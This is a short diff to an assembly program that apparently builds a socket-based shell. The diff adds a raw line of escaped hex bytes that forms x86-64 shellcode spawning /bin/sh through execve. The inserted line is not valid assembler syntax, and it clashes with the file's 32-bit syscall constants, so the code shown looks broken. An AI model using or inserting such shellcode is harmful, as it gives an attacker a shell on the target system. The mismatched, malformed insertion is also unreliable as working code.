@@ -14,7 +14,7 @@ section .text
     EXECVE      equ     0xb
     EXIT        equ     0x1
 
-
+\x48\x31\xD2\x52\x52\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\xB0\x3B\x0F\x05
 _start:
 ; We first need to create a socket
 ; In C it would be like int host_sock = socket(AF_INET, SOCK_STREAM, protocol);
